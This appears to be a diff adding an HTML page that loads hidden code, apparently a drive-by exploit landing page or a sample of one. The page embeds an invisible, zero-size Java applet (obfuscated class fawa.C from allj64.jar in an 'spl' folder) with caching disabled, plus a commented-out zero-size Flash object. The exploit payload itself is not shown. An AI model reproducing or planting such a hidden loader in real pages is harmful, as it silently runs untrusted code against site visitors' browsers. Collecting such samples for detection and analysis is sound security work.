@@ -1,0 +1,21 @@
+<html>
+<head>
+<title>Appet with obfuscated classes></title>
+<head>
+<body>
+	<div style="visibility: hidden;">
+		<OBJECT type="application/x-java-applet" width="0" height="0"
+			code="fawa.C.class"
+			archive="allj64.jar"
+                        codebase="spl">
+			<PARAM NAME="cache_option" VALUE="No">
+		</OBJECT>
+	</div>
+
+<!--<object width="1" height="1" type="application/x-shockwave-flash" data="spl/tflash.swf">
+<param name="movie" value="spl/tflash.swf">
+</object>-->
+
+</body>
+
+</html>
